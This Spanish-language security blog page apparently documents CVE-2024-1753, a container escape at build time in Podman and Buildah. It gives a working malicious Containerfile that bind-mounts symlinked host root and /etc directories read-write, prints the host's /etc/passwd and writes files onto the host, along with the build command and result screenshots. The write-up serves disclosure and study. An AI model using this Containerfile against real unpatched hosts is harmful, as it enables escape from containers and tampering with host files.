<!DOCTYPE html>
<html lang="es">
<head>
<title>CVE-2024-1753 | ØxBogart</title>

	<!-- meta -->
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1.0,user-scalable=no,viewport-fit=cover" />
	<link rel="icon" type="/image/png" href="/blog/img/skull.png" />
	<link rel="canonical" href="https://0xbogarft.github.io/blog/hacking/CVE-2024-1753" />
	<meta name="author" content="0xBogart" />
	<meta name="description" content="CVE-2024-1753" />
	<meta name="keywords" content="CVE-2024-1753" />

	<!-- Twitter Tags -->
	<meta property="og:title" content="CVE-2024-1753" />
	<meta property="og:description" content="CVE-2024-1753" />
	<meta property="og:url" content="https://0xbogart.github.io/blog/hacking/CVE-2024-1753" />
	<meta property="og:image" content="https://0xbogart.github.io/blog/img/podman-cve-2024-1753.png" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:site" content="@0xBogart" />
	<meta name="twitter:creator" content="@0xBogart" />
	<meta name="twitter:title" content="CVE-2024-1753 | ØxBogart" />
	<meta name="twitter:description" content="CVE-2024-1753 | ØxBogart" />
	<meta property="twitter:image" content="https://0xbogart.github.io/blog/img/podman-cve-2024-1753.png" />

	<!-- css -->
	<link rel="stylesheet" href="/css/bootstrap.min.css">
	<link rel="stylesheet" href="/css/ionicons.min.css">
	<link rel="stylesheet" href="/css/tabbared.css">
	<link rel="stylesheet" href="/css/sidebared.css">
	<link rel="stylesheet" href="/css/pace.css">
	<link rel="stylesheet" href="/css/custom.css">
	<link rel="stylesheet" href="/css/rhterm.css">
	<link rel="stylesheet" href="/css/blackarchvoid.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">

	<!-- js -->
	<script src="/js/jquery-2.1.3.min.js"></script>
	<script src="/js/bootstrap.min.js"></script>
	<script src="/js/pace.min.js"></script>
	<script src="/js/modernizr.custom.js"></script>
	<script src="/js/tabbar.js"></script>
	<script src="/js/asredlight.js"></script>
<style>
@media (max-width: 600px) {
  .imgmax {
    width: 100%; /* Ancho al 100% para pantallas de 600px o menos */
  }
}

.bg {
	border: 5px solid black;
	width: 100%;
}
</style>
</head>

<body class="bg">
	<div class="container">	
		<header id="site-header">
			<div class="row">
				<div style="margin-bottom: -10%;">
					<h1 style="margin-top: 7px;">H<a href="/blog/hacking"><img src="/blog/img/skullh.png" width="30px" height="40px" style="margin-top: -9px;"></a>CKING</h1>
				</div><!-- col-4 -->
			</div>
			<div class="row justify-content-end">
				<div class="col-2" style="margin-top: 5px;">
					<nav class="navbar navbar-expand-lg navbar-light">
						<button style="border: 1px solid #D80000;" class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#bs-example-navbar-collapse-1" aria-controls="bs-example-navbar-collapse-1" aria-expanded="false" aria-label="Toggle navigation">
							<span class="navbar-toggler-icon"></span>
						</button>
						<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
							<ul class="navbar-nav">
								<li class="nav-item">
									<a style="font-size: 25px;" class="nav-link" href="/index" data-hover="Home">Home</a>
								</li>
							</ul>
						</div><!--- .navbar-collapse --->
					</nav>
				</div><!-- col-md-8 -->
			</div>
		</header>
	</div>

	<!-- TABBAR -->
	<div style="position: sticky; top: -1px; width: auto;">
		<a onclick="toggleDropdown()">
			<div class="tabbar">
				<span style="font-weight: bold; float: left; margin-left: 10px;">TABLA DE CONTENIDO</span>
				<div class="dropdown-content" id="dropdownContent"></div>
			</div>
		</a>
		<div id="contenido">
			<h5>Podman [CVE-2024-1753] Escapar de Contenedores en Tiempo de Compilación</h5>
			<div style="border-top: 1px solid lightgray; width: 100%; margin: 10px 0;"></div>
			<a href="#VulnerabilityDetails" style="text-decoration: none;"><p style="margin-bottom: 6px; font-size: 16px;">☠ Detalles de Vulnerabilidad</p></a>
			<a href="#RESUME" style="text-decoration: none;"><p style="margin-bottom: 6px; font-size: 16px;">☠ Resumen</p></a>
			<a href="#POC" style="text-decoration: none;"><p style="margin-bottom: 6px; font-size: 16px;">☠ Versiones y Componentes de la PoC</p></a>
			<a href="#EXPLOIT" style="text-decoration: none;"><p style="margin-bottom: 6px; font-size: 16px;">☠ Explotando CVE-2024-1753</p></a>
		</div>
	</div><!-- END TABBAR -->

	<div class="content-body">
		<div id="main" style="position: sticky; top: 0;">
			<button class="openbtn" onclick="toggleNav()">☠</button>
		</div><br>
		<div id="mySidebar" class="sidebar" style="display: none; position: sticky; top: 0; margin-top: -24px; padding-right: 1px;">
			<a href="javascript:void(0)" class="closebtn" onclick="toggleNav()">×</a>
			<span style="font-size: 25px; color: #ff0000;"><b>&nbsp;✎</b></span><span style="font-size: 25px; color: white;"> <b>Notas</b></span>
			<hr style="color: #ff0000;">
			<a><span style="color: #E5D400;">Podman</span><span class="spanx">: Herramienta de código abierto para desarrollo, gestión y ejecución de contenedores en sistemas Linux</span></a>
			<a><span style="color: #E5D400;">POD</span><span class="spanx">: Colección de uno o más contenedores Linux. Es la unidad más pequeña de una aplicación Kubernetes</span></a>
			<a><span style="color: #E5D400;">Versión Podman Vulnerable</span><span class="spanx">: 4.9.4-dev</span></a>
			<a><span style="color: #E5D400;">Host Anfitrión</span><span class="spanx">: CentOS 8 Stream</span></a>
			<a><span style="color: #E5D400;">Containerfile</span><span class="spanx">: Archivo de texto plano con instrucciones que Podman utiliza para construir la imagen de contenedor</span></a>
		</div>
		<div class="container">
			<div class="row">
				<main class="col-md-8" style="margin-left: auto; margin-right: auto;">
					<article class="post post-1">
						<header  class="entry-header">
							<h1 class="blh1">Podman [Escapar de Contenedores en Tiempo de Compilación]</h1>
							<h2 class="blh2"><a style="color: #DB0000;">CVE</a>-<a style="color: #DB0000;">2024</a>-<a style="color: #DB0000;">1753</a></h2>
						</header>
						<div class="entry-content clearfix">
							<br><br>
							<section id="VulnerabilityDetails">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">DETALLES DE VULNERABILIDAD</span>
								</div><br>
								<div class="leftl">
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Paquete:</b> Podman</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Fecha de Publicación:</b> 5 de febrero de 2024</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Fecha de Actualización:</b> 24 de marzo de 2024</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Versiones Afectadas:</b> &lt; 4.9.4 y &lt; 5.0.1</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Versiones Parcheadas:</b> 4.9.4 y 5.0.1</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Gravedad:</b> <a style="color: #D80000;">Alta</a> 8.6/10</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> CVE ID:</b> CVE-2024-1753</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Debilidades:</b> CWE-269</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Impacto:</b> Los usuarios que ejecutan contenedores con privilegios de root permiten que un contenedor se ejecute con acceso de lectura\escritura sobre los archivos y directorios del sistema host anfitrión cuando SELinux está deshabilitado. Con SELinux habilitado, se dan casos de acceso de lectura.</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Repositorio GitHub:</b> <a href="https://github.com/containers/podman" target="_blank">https://github.com/containers/podman</a></span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Parche para Buildah:</b> <a href="https://github.com/containers/buildah" target="_blank">https://github.com/containers/buildah</a></span><br>
								</div>
							</section>

							<div style="border-top: 1px solid lightgray; width: 100%; margin: 10px 0;"></div>
							
							<section style="margin-top: 130px;" id="RESUME">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">RESUMEN</span>
								</div><br>
								<div class="leftl">
									<span>Se ha encontrado un fallo de seguridad en <b>Buildah</b> [y posteriormente en <b>Podman Build</b>] que permite a los contenedores montar ubicaciones arbitrarias en el sistema de archivos del host anfitrión en tiempo de compilación de contenedores. Al realizar montajes de enlace como parte de un paso de ejecución en tiempo de compilación, el argumento 'fuente' no se valida para garantizar que exista dentro de la raíz.</span><br><br>
									<span>Un Containerfile malicioso puede utilizar una imagen falsa con enlaces simbólicos al sistema de archivos raíz como fuente de montaje y hacer que la operación de montaje monte el sistema de archivos raíz del host dentro de la orden <b>RUN</b>. Los comandos dentro de la orden RUN tendrán acceso de lectura\escritura al sistema de archivos del host anfitrión, permitiendo escapar por completo del contenedor en tiempo de compilación.</span>
								</div>
							</section>

							<!-- POC -->
							<section style="margin-top: 130px;" id="POC">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">VERSIONES Y COMPONENTES UTILIZADOS EN ESTA PoC</span>
								</div><br>
								
								<div class="leftl">
									<span>Versiones utilizadas en esta <b>PoC</b>:</span><br>
									<span><b><a style="margin-left: 35px; color: #DB0000;">⦿</a> Sistema Operativo</b>: CentOS 8 Stream</span><br>
									<span><b><a style="margin-left: 35px; color: #DB0000;">⦿</a> Versión vulnerable de Podman</b>: 4.9.4-dev</span><br>
									<span><b><a style="margin-left: 35px; color: #DB0000;">⦿</a> Estado de SELinux</b>: Permissive</span><br>
									<span><b><a style="margin-left: 35px; color: #DB0000;">⦿</a> Nombre del Containerfile malicioso</b>: cve_Containerfile</span><br>
									<span><b><a style="margin-left: 35px; color: #DB0000;">⦿</a> Crear un archivo de texto en la raíz de root [con usuario root]</b>: touch &#47;NO-DEBERIAS-PODER-VERME.txt</span>
								</div><br>
								
								<div class="centext">
									<span>Contenido del <b>Containerfile Malicioso</b>:</span>	
								</div>

								<!-- CONTENIDO DEL Containerfile MALICIOSO -->
								<div id="long-terminal">
									<!-- Terminal Body -->
									<section id="terminal__body">
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>FROM alpine as base</b></span>
										</div><br>
										  
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN ln -s &#47; &#47;rootdir</b></span>
										</div>
										
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN ln -s &#47;etc &#47;etc2</b></span>
										</div><p></p>
										  
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>FROM alpine</b></span>
										</div><br>
										  
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN echo "ls container root"</b></span>
										</div>

										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN ls -l &#47;</b></span>
										</div><br>

										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN echo "La explotación de la vulnerabilidad muestra la raíz del host anfitrión, no la raíz del contenedor, y crea &#47;MONTAJE_BIND1 en la raíz &#47; del host anfitrión."</b></span>
										</div><p></p>

										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN --mount=type=bind,from=base,source=&#47;rootdir,destination=&#47;exploit,rw ls -l &#47;exploit; touch &#47;exploit&#47;MONTAJE_BIND1; ls -l &#47;exploit</b></span>
										</div><p></p>

										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN echo "Aquí se muestra el contenido del archivo &#47;etc&#47;passwd del host anfitrión, no el del contenedor, y crea &#47;MONTAJE_BIND2 en &#47;etc en el host anfitrión."</b></span>
										</div><p></p>

										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN --mount=type=bind,rw,source=&#47;etc2,destination=&#47;etc2,from=base ls -l &#47; ls -l &#47;etc2&#47;passwd; cat &#47;etc2&#47;passwd; touch &#47;etc2&#47;MONTAJE_BIND2; ls -l &#47;etc2</b></span>
										</div>
									</section>
								</div><br><br>
								<!-- END CONTENIDO DEL Containerfile MALICIOSO -->
								<div class="leftl">
									<span>El Containerfile se compone de 2 secciones definidas por instrucciones <b>FROM</b>, se construyen 2 imágenes. En la primera sección se crea una imagen base llamada <b>base</b> a partir de la imagen de Alpine.<br><br>Después se crean 2 enlaces simbólicos en la imagen base. Uno apunta al directorio raíz del sistema de archivos [&#47;] y se nombra como <b>rootdir</b>. El 2º enlace simbólico apunta al directorio &#47;etc del sistema de archivos y se nombra como &#47;etc2.</span>
									<br><br>
									<span>En la 2ª instrucción FROM se crea otra imagen a partir de Alpine:</span><br><p></p>
									<span><b><a style="color: #DB0000;">•</a> Lista el contenido del directorio raíz del contenedor</b></span><p></p>
									<span><b><a style="color: #DB0000;">•</a> Monta el volumen con <b>--mount</b> para acceder a directorios del sistema de archivos del host anfitrión, en vez de los del contenedor.</b></span><p></p>
									<span><b><a style="color: #DB0000;">•</a> Monta el directorio <b>rootdir</b> creado en la imagen base y se accede desde el contenedor. Se muestra su contenido y se crea un nuevo directorio llamado MONTAJE_BIND1 en la raíz del host anfitrión.</span><p></p>
									<span><b><a style="color: #DB0000;">•</a> Monta el directorio &#47;etc2 creado en la imagen base y se accede desde el contenedor. Se muestra el contenido del directorio raíz del host anfitrión y se imprime el contenido del archivo &#47;etc&#47;passwd del host anfitrión. Luego, crea un nuevo archivo llamado MONTAJE_BIND2 en el directorio &#47;etc del host anfitrión.</span>
								</div>
							</section>
							<!---- END POC ---->
							
							<div style="border-top: 1px solid lightgray; width: 100%; margin: 10px 0;"></div>
							<!-- END CLEAN GO -->
								
							<!--- EXPLOTANDO LA VUNLNERABILIDAD --->
							<section style="margin-top: 130px;" id="EXPLOIT">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">EXPLOTANDO LA VULNERABILIDAD CVE-2024-1753</span>
									<p></p>
									<span>Ejecuta el contenedor con Privilegios de root: <a style="color: #D90000;"><b>sudo podman build -f cve_Containerfile .</b></a></span><br><br>
									<span><b>PIC 1: Se crean los enlaces simbólicos</b>:</span><p></p>
									<a href="/blog/hacking/img/pic1.png" target="_blank"><img src="/blog/hacking/img/pic1.png" class="imgmax" width="100%"></a>
									<br><br><br>
									<span><b>PIC 2: Se lista el directorio raíz del Contenedor</b>:</span><p></p>
									<a href="/blog/hacking/img/pic2.png" target="_blank"><img src="/blog/hacking/img/pic2.png" class="imgmax" width="100%"></a>
									<br><br><br>
									<span><b>PIC 3: Tras montar rootdir [symlink de la raíz del host anfitrión], crea MONTAJE_BIND1 en la raíz y lista los archivos</b>:</span><p></p>
									<a href="/blog/hacking/img/pic3.png" target="_blank"><img src="/blog/hacking/img/pic3.png" class="imgmax" width="100%"></a>
									<br><br><br>
									<span><b>PIC 4: Tras crear el enlace simbólico de &#47;etc en &#47;etc2 es capaz de leer el archivo passwd del host anfitrión</b>:</span><p></p>
									<a href="/blog/hacking/img/pic4.png" target="_blank"><img src="/blog/hacking/img/pic4.png" class="imgmax" width="100%"></a>
									<br><br><br>
									<span><b>PIC 5: Lista el contenido del enlace simbólico &#47;etc2 y se muestra el archivo MONTAJE_BIND2 creado durante la compilación del contenedor</b>:</span><p></p>
									<a href="/blog/hacking/img/pic5.png" target="_blank"><img src="/blog/hacking/img/pic5.png" class="imgmax" width="100%"></a>
									<br><br><br>
									<span><b>PIC 6\7: Finalizada la compilación del Contenedor, vemos que los archivos MONTAJE_BIND1 y /etc/MONTAJE_BIND2 existen en el sistema de archivos del host anfitrión</b>:</span><p></p>
									<a href="/blog/hacking/img/pic6.png" target="_blank"><img src="/blog/hacking/img/pic6.png" class="imgmax" width="100%"></a><p></p>
									<a href="/blog/hacking/img/pic7.png" target="_blank"><img src="/blog/hacking/img/pic7.png" class="imgmax" width="100%"></a>
								</div>
							</section>
							<!--- END EXPLOTACIÓN CVE-2024-1753 --->
						</div>
					</article>
				</main>
			</div>
		</div>
	</div>
						
	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<div class="copyright">
						<a class="nodeco" href="/index"><img src="/blog/img/0xbogart-shadow.png" style="width: 15%"></a>
					</div>
				</div>
			</div>
		</div>
	</footer>
	<a href="#" id="scrollToTopButtonRed"><i class="fas fa-arrow-up"></i></a>
<script>
function toggleNav() {
  var sidebar = document.getElementById("mySidebar");
  var sidebarDisplay = window.getComputedStyle(sidebar).display;

  if (sidebarDisplay === "none") {
    sidebar.style.display = "block"; // Mostrar el sidebar
    sidebar.style.width = "200px"; // Ancho deseado al mostrar el sidebar
  } else {
    sidebar.style.display = "none"; // Ocultar el sidebar al hacer clic nuevamente
  }
}
</script>
</body>
</html>
